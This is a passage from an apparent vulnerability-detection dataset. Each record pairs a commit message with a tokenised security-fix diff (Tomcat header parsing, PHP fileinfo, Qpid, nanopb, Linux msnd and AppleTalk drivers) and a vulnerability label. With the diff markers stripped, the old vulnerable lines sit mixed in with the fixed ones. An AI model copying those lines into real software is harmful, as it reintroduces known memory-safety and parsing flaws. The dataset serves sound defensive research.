"void", "testMultipleWithInvalidStart2", "(", ")", "throws", "IOException", "{", "expected", ".", "add", "(", "\"", "bar", "\"", ");", "expected", ".", "add", "(", "\"", "foo", "\"", ");", "expected", ".", "add", "(", "\"", "host", "\"", ");", "doTestVary", "(", "\"", "OK", "{", "{{", ",", "Host", ",", "Foo", ",", "Bar", "\"", ",", "expected", ")", ";", "doTestVary", "(", "\"", "OK", "{", "{{", ",", "Host", ",", "Foo", ",", "Bar", "\"", ",", "expected", ",", "false", ")", ";", "}", "@", "@", "-", "111", ",", "7", "+", "111", ",", "7", "@", "@", "public", "void", "testMultipleWithInvalidMiddle2", "(", ")", "throws", "IOException", "{", "expected", ".", "add", "(", "\"", "bar", "\"", ");", "expected", ".", "add", "(", "\"", "foo", "\"", ");", "expected", ".", "add", "(", "\"", "host", "\"", ");", "doTestVary", "(", "\"", "Host", ",", "OK", "{", "{{", ",", "Foo", ",", "Bar", "\"", ",", "expected", ")", ";", "doTestVary", "(", "\"", "Host", ",", "OK", "{", "{{", ",", "Foo", ",", "Bar", "\"", ",", "expected", ",", "false", ")", ";", "}", "@", "@", "-", "121", ",", "21", "+", "121", ",", "80", "@", "@", "public", "void", "testMultipleWithInvalidEnd2", "(", ")", "throws", "IOException", "{", "expected", ".", "add", "(", "\"", "bar", "\"", ");", "expected", ".", "add", "(", "\"", "foo", "\"", ");", "expected", ".", "add", "(", "\"", "host", "\"", ");", "doTestVary", "(", "\"", "Host", ",", "Foo", ",", "Bar", ",", "OK", "{", "{{", "\",", "expected", ")", ";", "doTestVary", "(", "\"", "Host", ",", "Foo", ",", "Bar", ",", "OK", "{", "{{", "\",", "expected", ",", "false", ")", ";", "}", "@", "SuppressWarnings", "(", "\"", "deprecation", "\"", ")", "private", "void", "doTestVary", "(", "String", "input", ",", "Set", "<", "String", ">", "expected", ")", "throws", "IOException", "{", "private", "void", "doTestVary", "(", "String", "input", ",", "Set", "<", "String", ">", "expectedTokens", ",", "boolean", "expectedResult", ")", "throws", "IOException", "{", "StringReader", "reader", "=", "new", "StringReader", "(", "input", ")", ";", "Set", "<", "String", ">", "result", "=", "new", "HashSet", "<", ">(", ");", "Vary", ".", "parseVary", "(", "reader", ",", "result", ")", ";", "Assert", ".", "assertEquals", "(", "expected", ",", "result", ")", ";", "Set", "<", "String", ">", "tokens", "=", "new", "HashSet", "<", ">(", ");", "Vary", ".", "parseVary", "(", "reader", ",", "tokens", ")", ";", "Assert", ".", "assertEquals", "(", "expectedTokens", ",", "tokens", ")", ";", "/", "/", "Can", "'", "t", "use", "reset", "(", ").", "Parser", "uses", "marks", ".", "reader", "=", "new", "StringReader", "(", "input", ")", ";", "result", ".", "clear", "(", ");", "TokenList", ".", "parseTokenList", "(", "reader", ",", "result", ")", ";", "Assert", ".", "assertEquals", "(", "expected", ",", "result", ")", ";", "tokens", ".", "clear", "(", ");", "boolean", "result", "=", "TokenList", ".", "parseTokenList", "(", "reader", ",", "tokens", ")", ";", "Assert", ".", "assertEquals", "(", "expectedTokens", ",", "tokens", ")", ";", "Assert", ".", "assertEquals", "(", "Boolean", ".", "valueOf", "(", "expectedResult", ")", ",", "Boolean", ".", "valueOf", "(", "result", ")", ");", "}", "@", "Test", "public", "void", "testMultipleHeadersValidWithoutNull", "(", ")", "throws", "IOException", "{", "doTestMultipleHeadersValid", "(", "false", ")", ";", "}", "@", "Test", "public", "void", "testMultipleHeadersValidWithNull", "(", ")", "throws", "IOException", "{", "doTestMultipleHeadersValid", "(", "true", ")", ";", "}", "private", "void", "doTestMultipleHeadersValid", "(", "boolean", "withNull", ")", "throws", "IOException", "{", "Set", "<", "String", ">", "expectedTokens", "=", "new", "HashSet", "<", ">(", ");", "expectedTokens", ".", "add", "(", "\"", "bar", "\"", ");", "expectedTokens", ".", "add", "(", "\"", "foo", "\"", ");", "expectedTokens", ".", "add", "(", "\"", "foo2", "\"", ");", "Set", "<", "String", ">", "inputs", "=", "new", "HashSet", "<", ">(", ");", "inputs", ".", "add", "(", "\"", "foo", "\"", ");", "if", "(", "withNull", ")", "{", "inputs", ".", "add", "(", "null", ")", ";", "}", "inputs", ".", "add", "(", "\"", "bar", ",", "foo2", "\"", ");", "Set", "<", "String", ">", "tokens", "=", "new", "HashSet", "<", ">(", ");", "boolean", "result", "=", "TokenList", ".", "parseTokenList", "(", "Collections", ".", "enumeration", "(", "inputs", ")", ",", "tokens", ")", ";", "Assert", ".", "assertEquals", "(", "expectedTokens", ",", "tokens", ")", ";", "Assert", ".", "assertTrue", "(", "result", ")", ";", "}", "@", "Test", "public", "void", "doTestMultipleHeadersInvalid", "(", ")", "throws", "IOException", "{", "Set", "<", "String", ">", "expectedTokens", "=", "new", "HashSet", "<", ">(", ");", "expectedTokens", ".", "add", "(", "\"", "bar", "\"", ");", "expectedTokens", ".", "add", "(", "\"", "bar2", "\"", ");", "expectedTokens", ".", "add", "(", "\"", "foo", "\"", ");", "expectedTokens", ".", "add", "(", "\"", "foo2", "\"", ");", "expectedTokens", ".", "add", "(", "\"", "foo3", "\"", ");", "Set", "<", "String", ">", "inputs", "=", "new", "HashSet", "<", ">(", ");", "inputs", ".", "add", "(", "\"", "foo", "\"", ");", "inputs", ".", "add", "(", "\"", "bar2", ",", "}", "}}", ",", "foo3", "\"", ");", "inputs", ".", "add", "(", "\"", "bar", ",", "foo2", "\"", ");", "Set", "<", "String", ">", "tokens", "=", "new", "HashSet", "<", ">(", ");", "boolean", "result", "=", "TokenList", ".", "parseTokenList", "(", "Collections", ".", "enumeration", "(", "inputs", ")", ",", "tokens", ")", ";", "Assert", ".", "assertEquals", "(", "expectedTokens", ",", "tokens", ")", ";", "Assert", ".", "assertFalse", "(", "result", ")", ";", "}", "}", "@", "@", "-", "164", ",", "6", "+", "164", ",", "11", "@", "@", "Add", "support", "for", "RFC", "5915", "formatted", ",", "unencrypted", "EC", "key", "files", "when", "using", "a", "JSSE", "based", "TLS", "connector", ".", "(", "markt", ")", "<", "/", "add", ">", "<", "fix", ">", "Correct", "a", "regression", "introduced", "in", "9", ".", "0", ".", "28", "that", "meant", "invalid", "tokens", "in", "the", "<", "code", ">", "Transfer", "-", "Encoding", "<", "/", "code", ">", "header", "were", "ignored", "rather", "than", "treated", "as", "an", "error", ".", "(", "markt", ")", "<", "/", "fix", ">", "<", "/", "changelog", ">", "<", "/", "subsection", ">", "<", "subsection", "name", "=", "\"", "Jasper", "\"", ">"], "docstring_tokens": ["http", "request", "smuggling"]}
{"contents": ["Fixed", "bug", "#68735", "fileinfo", "out-of-bounds", "memory", "access"], "code_tokens": ["@", "@", "-", "4", ",", "6", "+", "4", ",", "13", "@", "@", "PHP", "NEWS", "-", "CGI", ":", ".", "Fix", "bug", "#", "68618", "(", "out", "of", "bounds", "read", "crashes", "php", "-", "cgi", ")", ".", "(", "Stas", ")", "-", "Fileinfo", ":", ".", "Removed", "readelf", ".", "c", "and", "related", "code", "from", "libmagic", "sources", "(", "Remi", ",", "Anatol", ")", ".", "Fixed", "bug", "#", "68735", "(", "fileinfo", "out", "-", "of", "-", "bounds", "memory", "access", ")", ".", "(", "Anatol", ")", "18", "Dec", "2014", "PHP", "5", ".", "4", ".", "36", "-", "Core", ":", "@", "@", "-", "884", ",", "14", "+", "884", ",", "17", "@", "@", "mconvert", "(", "struct", "magic_set", "*", "ms", ",", "struct", "magic", "*", "m", ",", "int", "flip", ")", "size_t", "sz", "=", "file_pstring_length_size", "(", "m", ")", ";", "char", "*", "ptr1", "=", "p", "-", ">", "s", ",", "*", "ptr2", "=", "ptr1", "+", "sz", ";", "size_t", "len", "=", "file_pstring_get_length", "(", "m", ",", "ptr1", ")", ";", "if", "(", "len", ">", "=", "sizeof", "(", "p", "-", ">", "s", ")", ")", "{", "sz", "=", "sizeof", "(", "p", "-", ">", "s", ")", "-", "sz", ";", "/", "*", "maximum", "length", "of", "string", "*", "/", "if", "(", "len", ">", "=", "sz", ")", "{", "/", "*", "*", "The", "size", "of", "the", "pascal", "string", "length", "(", "sz", ")", "*", "is", "1", ",", "2", ",", "or", "4", ".", "We", "need", "at", "least", "1", "byte", "for", "NUL", "*", "termination", ",", "but", "we", "'", "ve", "already", "truncated", "the", "*", "string", "by", "p", "-", ">", "s", ",", "so", "we", "need", "to", "deduct", "sz", ".", "*", "Because", "we", "can", "use", "one", "of", "the", "bytes", "of", "the", "length", "*", "after", "we", "shifted", "as", "NUL", "termination", ".", "*", "/", "len", "=", "sizeof", "(", "p", "-", ">", "s", ")", "-", "sz", ";", "len", "=", "sz", ";", "}", "while", "(", "len", "-", "-)", "*", "ptr1", "+", "+", "=", "*", "ptr2", "+", "+;", "@", "@", "-", "0", ",", "0", "+", "1", ",", "16", "@", "@", "-", "-", "TEST", "-", "-", "Bug", "#", "68735", "fileinfo", "out", "-", "of", "-", "bounds", "memory", "access", "-", "-", "SKIPIF", "-", "-", "<", "?", "php", "require_once", "(", "dirname", "(", "__FILE__", ")", ".", "'", "/", "skipif", ".", "inc", "'", ");", "?", ">", "-", "-", "FILE", "-", "-", "<", "?", "php", "$", "test_file", "=", "dirname", "(", "__FILE__", ")", ".", "DIRECTORY_SEPARATOR", ".", "\"", "bug68735", ".", "jpg", "\"", ";", "$", "f", "=", "new", "finfo", ";", "var_dump", "(", "$", "f", "-", ">", "file", "(", "$", "test_file", ")", ");", "?", ">", "=", "==", "DONE", "=", "==", "-", "-", "EXPECTF", "-", "-", "string", "(", "%", "d", ")", "\"", "JPEG", "image", "data", ",", "JFIF", "standard", "1", ".", "01", ",", "comment", ":", "\"", "%", "S", "\"", "\"", "=", "==", "DONE", "=", "=="], "docstring_tokens": ["out-of-bounds", "read"]}
{"contents": ["QPID-7257:", "[Java", "Broker]", "Correct", "connection", "state", "logging", "(fix", ")"], "code_tokens": ["@", "@", "-", "51", ",", "6", "+", "51", ",", "7", "@", "@", "import", "org", ".", "apache", ".", "qpid", ".", "server", ".", "security", ".", "auth", ".", "AuthenticationResult", ".", "AuthenticationStatus", ";", "import", "org", ".", "apache", ".", "qpid", ".", "server", ".", "security", ".", "auth", ".", "SubjectAuthenticationResult", ";", "import", "org", ".", "apache", ".", "qpid", ".", "server", ".", "transport", ".", "AMQPConnection", ";", "import", "org", ".", "apache", ".", "qpid", ".", "server", ".", "util", ".", "ConnectionScopedRuntimeException", ";", "import", "org", ".", "apache", ".", "qpid", ".", "server", ".", "virtualhost", ".", "VirtualHostUnavailableException", ";", "import", "org", ".", "apache", ".", "qpid", ".", "transport", ".", "*;", "import", "org", ".", "apache", ".", "qpid", ".", "transport", ".", "network", ".", "NetworkConnection", ";", "@", "@", "-", "112", ",", "8", "+", "113", ",", "10", "@", "@", "private", "void", "assertState", "(", "final", "ServerConnection", "conn", ",", "final", "ConnectionState", "requ", "{", "if", "(", "_state", "!", "=", "requiredState", ")", "{", "conn", ".", "sendConnectionClose", "(", "ConnectionCloseCode", ".", "FRAMING_ERROR", ",", "\"", "Command", "Invalid", "expected", "\"", "+", "requiredState", "+", "\"", "but", "was", "\"", "+", "_state", ")", ";", "String", "replyText", "=", "\"", "Command", "Invalid", ",", "expected", "\"", "+", "requiredState", "+", "\"", "but", "was", "\"", "+", "_state", ";", "conn", ".", "sendConnectionClose", "(", "ConnectionCloseCode", ".", "FRAMING_ERROR", ",", "replyText", ")", ";", "conn", ".", "closeAndIgnoreFutureInput", "(", ");", "throw", "new", "ConnectionScopedRuntimeException", "(", "replyText", ")", ";", "}", "}", "@", "@", "-", "918", ",", "8", "+", "918", ",", "9", "@", "@", "void", "assertState", "(", "final", "ConnectionState", "requiredState", ")", "{", "if", "(", "_state", "!", "=", "requiredState", ")", "{", "sendConnectionClose", "(", "AMQConstant", ".", "COMMAND_INVALID", ",", "\"", "Command", "Invalid", "\"", ",", "0", ")", ";", "String", "replyText", "=", "\"", "Command", "Invalid", ",", "expected", "\"", "+", "requiredState", "+", "\"", "but", "was", "\"", "+", "_state", ";", "sendConnectionClose", "(", "AMQConstant", ".", "COMMAND_INVALID", ",", "replyText", ",", "0", ")", ";", "throw", "new", "ConnectionScopedRuntimeException", "(", "replyText", ")", ";", "}", "}", "@", "@", "-", "933", ",", "6", "+", "934", ",", "8", "@", "@", "public", "void", "receiveConnectionOpen", "(", "AMQShortString", "virtualHostName", ",", "_logger", ".", "debug", "(", "\"", "RECV", "ConnectionOpen", "[", "\"", "+", "\"", "virtualHost", ":", "\"", "+", "virtualHostName", "+", "\"", "capabilities", ":", "\"", "+", "capabilities", "+", "\"", "insist", ":", "\"", "+", "insist", "+", "\"", "]", "\")", ";", "}", "assertState", "(", "ConnectionState", ".", "AWAIT_OPEN", ")", ";", "String", "virtualHostStr", "=", "AMQShortString", ".", "toString", "(", "virtualHostName", ")", ";", "if", "(", "(", "virtualHostStr", "!", "=", "null", ")", "&", "&", "virtualHostStr", ".", "charAt", "(", "0", ")", "=", "=", "'", "/'", ")", "{"], "docstring_tokens": ["authentication", "bypass"]}
{"contents": ["Fix", "invalid", "free()", "after", "failed", "realloc()", "(GHSA-gcx3-7m76-287p)"], "code_tokens": ["@", "@", "-", "720", ",", "11", "+", "720", ",", "11", "@", "@", "static", "bool", "checkreturn", "decode_pointer_field", "(", "pb_istream_t", "*", "stream", ",", "pb_wire_type_", "if", "(", "!", "check_wire_type", "(", "wire_type", ",", "field", ")", ")", "PB_RETURN_ERROR", "(", "stream", ",", "\"", "wrong", "wire", "type", "\"", ");", "(", "*", "size", ")", "++", ";", "if", "(", "!", "allocate_field", "(", "stream", ",", "field", "-", ">", "pField", ",", "field", "-", ">", "data_size", ",", "*", "size", ")", ")", "if", "(", "!", "allocate_field", "(", "stream", ",", "field", "-", ">", "pField", ",", "field", "-", ">", "data_size", ",", "(", "size_t", ")", "(*", "size", "+", "1", ")", "))", "return", "false", ";", "field", "-", ">", "pData", "=", "*", "(", "char", "*", "*)", "field", "-", ">", "pField", "+", "field", "-", ">", "data_size", "*", "(", "*", "size", "-", "1", ")", ";", "field", "-", ">", "pData", "=", "*", "(", "char", "*", "*)", "field", "-", ">", "pField", "+", "field", "-", ">", "data_size", "*", "(", "*", "size", ")", ";", "(", "*", "size", ")", "++", ";", "initialize_pointer_field", "(", "field", "-", ">", "pData", ",", "field", ")", ";", "return", "decode_basic_field", "(", "stream", ",", "field", ")", ";", "}"], "docstring_tokens": ["out", "of", "memory", "condition"]}
{"contents": ["ALSA:", "msnd:", "Optimize", "/", "harden", "DSP", "and", "MIDI", "loops", "The", "ISA", "msnd", "drivers", "have", "loops", "fetching", "the", "ring-buffer", "head,", "tail", "and", "size", "values", "inside", "the", "loops.", "Such", "codes", "are", "inefficient", "and", "fragile.", "This", "patch", "optimizes", "it,", "and", "also", "adds", "the", "sanity", "check", "to", "avoid", "the", "endless", "loops.", "Bugzilla:", "https://bugzilla.kernel.org/show_bug.cgi?id=196131", "Bugzilla:", "https://bugzilla.kernel.org/show_bug.cgi?id=196133", "Signed-off-by:", "Takashi", "Iwai", "<tiwai@suse.de>"], "code_tokens": ["@", "@", "-", "120", ",", "24", "+", "120", ",", "24", "@", "@", "void", "snd_msndmidi_input_read", "(", "void", "*", "mpuv", ")", "unsigned", "long", "flags", ";", "struct", "snd_msndmidi", "*", "mpu", "=", "mpuv", ";", "void", "*", "pwMIDQData", "=", "mpu", "-", ">", "dev", "-", ">", "mappedbase", "+", "MIDQ_DATA_BUFF", ";", "u16", "head", ",", "tail", ",", "size", ";", "spin_lock_irqsave", "(", "&", "mpu", "-", ">", "input_lock", ",", "flags", ")", ";", "while", "(", "readw", "(", "mpu", "-", ">", "dev", "-", ">", "MIDQ", "+", "JQS_wTail", ")", "!", "=", "readw", "(", "mpu", "-", ">", "dev", "-", ">", "MIDQ", "+", "JQS_wHead", ")", ")", "{", "u16", "wTmp", ",", "val", ";", "val", "=", "readw", "(", "pwMIDQData", "+", "2", "*", "readw", "(", "mpu", "-", ">", "dev", "-", ">", "MIDQ", "+", "JQS_wHead", ")", ");", "if", "(", "test_bit", "(", "MSNDMIDI_MODE_BIT_INPUT_TRIGGER", ",", "&", "mpu", "-", ">", "mode", ")", ")", "snd_rawmidi_receive", "(", "mpu", "-", ">", "substream_input", ",", "(", "unsigned", "char", "*", ")&", "val", ",", "1", ")", ";", "wTmp", "=", "readw", "(", "mpu", "-", ">", "dev", "-", ">", "MIDQ", "+", "JQS_wHead", ")", "+", "1", ";", "if", "(", "wTmp", ">", "readw", "(", "mpu", "-", ">", "dev", "-", ">", "MIDQ", "+", "JQS_wSize", ")", ")", "writew", "(", "0", ",", "mpu", "-", ">", "dev", "-", ">", "MIDQ", "+", "JQS_wHead", ")", ";", "else", "writew", "(", "wTmp", ",", "mpu", "-", ">", "dev", "-", ">", "MIDQ", "+", "JQS_wHead", ")", ";", "head", "=", "readw", "(", "mpu", "-", ">", "dev", "-", ">", "MIDQ", "+", "JQS_wHead", ")", ";", "tail", "=", "readw", "(", "mpu", "-", ">", "dev", "-", ">", "MIDQ", "+", "JQS_wTail", ")", ";", "size", "=", "readw", "(", "mpu", "-", ">", "dev", "-", ">", "MIDQ", "+", "JQS_wSize", ")", ";", "if", "(", "head", ">", "size", "|", "|", "tail", ">", "size", ")", "goto", "out", ";", "while", "(", "head", "!", "=", "tail", ")", "{", "unsigned", "char", "val", "=", "readw", "(", "pwMIDQData", "+", "2", "*", "head", ")", ";", "if", "(", "test_bit", "(", "MSNDMIDI_MODE_BIT_INPUT_TRIGGER", ",", "&", "mpu", "-", ">", "mode", ")", ")", "snd_rawmidi_receive", "(", "mpu", "-", ">", "substream_input", ",", "&", "val", ",", "1", ")", ";", "if", "(", "++", "head", ">", "size", ")", "head", "=", "0", ";", "writew", "(", "head", ",", "mpu", "-", ">", "dev", "-", ">", "MIDQ", "+", "JQS_wHead", ")", ";", "}", "out", ":", "spin_unlock_irqrestore", "(", "&", "mpu", "-", ">", "input_lock", ",", "flags", ")", ";", "}", "EXPORT_SYMBOL", "(", "snd_msndmidi_input_read", ")", ";", "@", "@", "-", "170", ",", "23", "+", "170", ",", "24", "@", "@", "static", "irqreturn_t", "snd_msnd_interrupt", "(", "int", "irq", ",", "void", "*", "dev_id", ")", "{", "struct", "snd_msnd", "*", "chip", "=", "dev_id", ";", "void", "*", "pwDSPQData", "=", "chip", "-", ">", "mappedbase", "+", "DSPQ_DATA_BUFF", ";", "u16", "head", ",", "tail", ",", "size", ";", "/", "*", "Send", "ack", "to", "DSP", "*", "/", "/", "*", "inb", "(", "chip", "-", ">", "io", "+", "HP_RXL", ")", ";", "*", "/", "/", "*", "Evaluate", "queued", "DSP", "messages", "*", "/", "while", "(", "readw", "(", "chip", "-", ">", "DSPQ", "+", "JQS_wTail", ")", "!", "=", "readw", "(", "chip", "-", ">", "DSPQ", "+", "JQS_wHead", ")", ")", "{", "u16", "wTmp", ";", "snd_msnd_eval_dsp_msg", "(", "chip", ",", "readw", "(", "pwDSPQData", "+", "2", "*", "readw", "(", "chip", "-", ">", "DSPQ", "+", "JQS_wHead", ")", "))", ";", "wTmp", "=", "readw", "(", "chip", "-", ">", "DSPQ", "+", "JQS_wHead", ")", "+", "1", ";", "if", "(", "wTmp", ">", "readw", "(", "chip", "-", ">", "DSPQ", "+", "JQS_wSize", ")", ")", "writew", "(", "0", ",", "chip", "-", ">", "DSPQ", "+", "JQS_wHead", ")", ";", "else", "writew", "(", "wTmp", ",", "chip", "-", ">", "DSPQ", "+", "JQS_wHead", ")", ";", "head", "=", "readw", "(", "chip", "-", ">", "DSPQ", "+", "JQS_wHead", ")", ";", "tail", "=", "readw", "(", "chip", "-", ">", "DSPQ", "+", "JQS_wTail", ")", ";", "size", "=", "readw", "(", "chip", "-", ">", "DSPQ", "+", "JQS_wSize", ")", ";", "if", "(", "head", ">", "size", "|", "|", "tail", ">", "size", ")", "goto", "out", ";", "while", "(", "head", "!", "=", "tail", ")", "{", "snd_msnd_eval_dsp_msg", "(", "chip", ",", "readw", "(", "pwDSPQData", "+", "2", "*", "head", ")", ");", "if", "(", "++", "head", ">", "size", ")", "head", "=", "0", ";", "writew", "(", "head", ",", "chip", "-", ">", "DSPQ", "+", "JQS_wHead", ")", ";", "}", "out", ":", "/", "*", "Send", "ack", "to", "DSP", "*", "/", "inb", "(", "chip", "-", ">", "io", "+", "HP_RXL", ")", ";", "return", "IRQ_HANDLED", ";"], "docstring_tokens": ["double-fetch", "error"]}
{"contents": ["Subject:", "[PATCH]", "appletalk:", "Fix", "skb", "leak", "when", "ipddp", "interface", "is", "not", "loaded", "And", "also", "do", "a", "better", "job", "of", "returning", "proper", "NET_{RX,XMIT}_", "values.", "Based", "on", "a", "patch", "and", "suggestions", "by", "Mark", "Smith.", "This", "fixes", "Reported-by:", "Mark", "Smith", "<lk-netdev@lk-netdev.nosense.org>", "Signed-off-by:", "Arnaldo", "Carvalho", "de", "Melo", "<acme@redhat.com>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["@", "@", "-", "177", ",", "8", "+", "177", ",", "7", "@", "@", "static", "netdev_tx_t", "ipddp_xmit", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "dev", ")", "dev", "-", ">", "stats", ".", "tx_packets", "+", "+;", "dev", "-", ">", "stats", ".", "tx_bytes", "+", "=", "skb", "-", ">", "len", ";", "if", "(", "aarp_send_ddp", "(", "rt", "-", ">", "dev", ",", "skb", ",", "&", "rt", "-", ">", "at", ",", "NULL", ")", "<", "0", ")", "dev_kfree_skb", "(", "skb", ")", ";", "aarp_send_ddp", "(", "rt", "-", ">", "dev", ",", "skb", ",", "&", "rt", "-", ">", "at", ",", "NULL", ")", ";", "spin_unlock", "(", "&", "ipddp_route_lock", ")", ";", "@", "@", "-", "599", ",", "7", "+", "599", ",", "7", "@", "@", "int", "aarp_send_ddp", "(", "struct", "net_device", "*", "dev", ",", "struct", "sk_buff", "*", "skb", ",", "/", "*", "Non", "ELAP", "we", "cannot", "do", ".", "*", "/", "if", "(", "dev", "-", ">", "type", "!", "=", "ARPHRD_ETHER", ")", "return", "-", "1", ";", "goto", "free_it", ";", "skb", "-", ">", "dev", "=", "dev", ";", "skb", "-", ">", "protocol", "=", "htons", "(", "ETH_P_ATALK", ")", ";", "@", "@", "-", "634", ",", "7", "+", "634", ",", "7", "@", "@", "int", "aarp_send_ddp", "(", "struct", "net_device", "*", "dev", ",", "struct", "sk_buff", "*", "skb", ",", "if", "(", "!", "a", ")", "{", "/", "*", "Whoops", "slipped", ".", "..", "good", "job", "it", "'", "s", "an", "unreliable", "protocol", "8", ")", "*", "/", "write_unlock_bh", "(", "&", "aarp_lock", ")", ";", "return", "-", "1", ";", "goto", "free_it", ";", "}", "/", "*", "Set", "up", "the", "queue", "*", "/", "@", "@", "-", "663", ",", "15", "+", "663", ",", "21", "@", "@", "int", "aarp_send_ddp", "(", "struct", "net_device", "*", "dev", ",", "struct", "sk_buff", "*", "skb", ",", "write_unlock_bh", "(", "&", "aarp_lock", ")", ";", "/", "*", "Tell", "the", "ddp", "layer", "we", "have", "taken", "over", "for", "this", "frame", ".", "*", "/", "return", "0", ";", "goto", "sent", ";", "sendit", ":", "if", "(", "skb", "-", ">", "sk", ")", "skb", "-", ">", "priority", "=", "skb", "-", ">", "sk", "-", ">", "sk_priority", ";", "dev_queue_xmit", "(", "skb", ")", ";", "if", "(", "dev_queue_xmit", "(", "skb", ")", ")", "goto", "drop", ";", "sent", ":", "return", "1", ";", "return", "NET_XMIT_SUCCESS", ";", "free_it", ":", "kfree_skb", "(", "skb", ")", ";", "drop", ":", "return", "NET_XMIT_DROP", ";", "}", "EXPORT_SYMBOL", "(", "aarp_send_ddp", ")", ";", "/", "*", "*", "An", "entry", "in", "the", "aarp", "unresolved", "queue", "has", "become", "resolved", ".", "Send", "@", "@", "-", "1270", ",", "8", "+", "1270", ",", "10", "@", "@", "static", "int", "handle_ip_over_ddp", "(", "struct", "sk_buff", "*", "skb", ")", "struct", "net_device_stats", "*", "stats", ";", "/", "*", "This", "needs", "to", "be", "able", "to", "handle", "ipddp", "\"", "N", "\"", "devices", "*", "/", "if", "(", "!", "dev", ")", "return", "-", "ENODEV", ";", "if", "(", "!", "dev", ")", "{", "kfree_skb", "(", "skb", ")", ";", "return", "NET_RX_DROP", ";", "}", "skb", "-", ">", "protocol", "=", "htons", "(", "ETH_P_IP", ")", ";", "skb_pull", "(", "skb", ",", "13", ")", ";", "@", "@", "-", "1281", ",", "18", "+", "1283", ",", "16", "@", "@", "static", "int", "handle_ip_over_ddp", "(", "struct", "sk_buff", "*", "skb", ")", "stats", "=", "netdev_priv", "(", "dev", ")", ";", "stats", "-", ">", "rx_packets", "+", "+;", "stats", "-", ">", "rx_bytes", "+", "=", "skb", "-", ">", "len", "+", "13", ";", "netif_rx", "(", "skb", ")", ";", "/", "*", "Send", "the", "SKB", "up", "to", "a", "higher", "place", ".", "*", "/", "return", "0", ";", "return", "netif_rx", "(", "skb", ")", ";", "/", "*", "Send", "the", "SKB", "up", "to", "a", "higher", "place", ".", "*", "/", "}", "#", "else", "/", "*", "make", "it", "easy", "for", "gcc", "to", "optimize", "this", "test", "out", ",", "i", ".", "e", ".", "kill", "the", "code", "*", "/", "#", "define", "is_ip_over_ddp", "(", "skb", ")", "0", "#", "define", "handle_ip_over_ddp", "(", "skb", ")", "0", "#", "endif", "static", "void", "atalk_route_packet", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "dev", ",", "struct", "ddpehdr", "*", "ddp", ",", "__u16", "len_hops", ",", "int", "origlen", ")", "static", "int", "atalk_route_packet", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "dev", ",", "struct", "ddpehdr", "*", "ddp", ",", "__u16", "len_hops", ",", "int", "origlen", ")", "{", "struct", "atalk_route", "*", "rt", ";", "struct", "atalk_addr", "ta", ";", "@", "@", "-", "1359", ",", "8", "+", "1359", ",", "6", "@", "@", "static", "void", "atalk_route_packet", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "dev", ",", "/", "*", "22", "bytes", "-", "12", "ether", ",", "2", "len", ",", "3", "802", ".", "2", "5", "snap", "*", "/", "struct", "sk_buff", "*", "nskb", "=", "skb_realloc_headroom", "(", "skb", ",", "32", ")", ";", "kfree_skb", "(", "skb", ")", ";", "if", "(", "!", "nskb", ")", "goto", "out", ";", "skb", "=", "nskb", ";", "}", "else", "skb", "=", "skb_unshare", "(", "skb", ",", "GFP_ATOMIC", ")", ";", "@", "@", "-", "1369", ",", "12", "+", "1367", ",", "16", "@", "@", "static", "void", "atalk_route_packet", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "dev", ",", "*", "If", "the", "buffer", "didn", "'", "t", "vanish", "into", "the", "lack", "of", "space", "bitbucket", "we", "can", "*", "send", "it", ".", "*", "/", "if", "(", "skb", "&", "&", "aarp_send_ddp", "(", "rt", "-", ">", "dev", ",", "skb", ",", "&", "ta", ",", "NULL", ")", "=", "=", "-", "1", ")", "goto", "free_it", ";", "out", ":", "return", ";", "if", "(", "skb", "=", "=", "NULL", ")", "goto", "drop", ";", "if", "(", "aarp_send_ddp", "(", "rt", "-", ">", "dev", ",", "skb", ",", "&", "ta", ",", "NULL", ")", "=", "=", "NET_XMIT_DROP", ")", "return", "NET_RX_DROP", ";", "return", "NET_XMIT_SUCCESS", ";", "free_it", ":", "kfree_skb", "(", "skb", ")", ";", "drop", ":", "return", "NET_RX_DROP", ";", "}", "/", "**", "@", "@", "-", "1448", ",", "8", "+", "1450", ",", "7", "@", "@", "static", "int", "atalk_rcv", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "dev", ",", "/", "*", "Not", "ours", ",", "so", "we", "route", "the", "packet", "via", "the", "correct", "*", "AppleTalk", "iface", "*", "/", "atalk_route_packet", "(", "skb", ",", "dev", ",", "ddp", ",", "len_hops", ",", "origlen", ")", ";", "return", "NET_RX_SUCCESS", ";", "return", "atalk_route_packet", "(", "skb", ",", "dev", ",", "ddp", ",", "len_hops", ",", "origlen", ")", ";", "}", "/", "*", "if", "IP", "over", "DDP", "is", "not", "selected", "this", "code", "will", "be", "optimized", "out", "*", "/", "@", "@", "-", "1655", ",", "10", "+", "1656", ",", "10", "@", "@", "static", "int", "atalk_sendmsg", "(", "struct", "kiocb", "*", "iocb", ",", "struct", "socket", "*", "sock", ",", "struct", "msghdr", "if", "(", "skb2", ")", "{", "loopback", "=", "1", ";", "SOCK_DEBUG", "(", "sk", ",", "\"", "SK", "%", "p", ":", "send", "out", "(", "copy", ")", ".\\", "n", "\"", ",", "sk", ")", ";", "if", "(", "aarp_send_ddp", "(", "dev", ",", "skb2", ",", "&", "usat", "-", ">", "sat_addr", ",", "NULL", ")", "=", "=", "-", "1", ")", "kfree_skb", "(", "skb2", ")", ";", "/", "*", "else", "queued", "/", "sent", "above", "in", "the", "aarp", "queue", "*", "/", "/", "*", "*", "If", "it", "fails", "it", "is", "queued", "/", "sent", "above", "in", "the", "aarp", "queue", "*", "/", "aarp_send_ddp", "(", "dev", ",", "skb2", ",", "&", "usat", "-", ">", "sat_addr", ",", "NULL", ")", ";", "}", "}", "@", "@", "-", "1688", ",", "9", "+", "1689", ",", "10", "@", "@", "static", "int", "atalk_sendmsg", "(", "struct", "kiocb", "*", "iocb", ",", "struct", "socket", "*", "sock", ",", "struct", "msghdr", "usat", "=", "&", "gsat", ";", "}", "if", "(", "aarp_send_ddp", "(", "dev", ",", "skb", ",", "&", "usat", "-", ">", "sat_addr", ",", "NULL", ")", "=", "=", "-", "1", ")", "kfree_skb", "(", "skb", ")", ";", "/", "*", "else", "queued", "/", "sent", "above", "in", "the", "aarp", "queue", "*", "/", "/", "*", "*", "If", "it", "fails", "it", "is", "queued", "/", "sent", 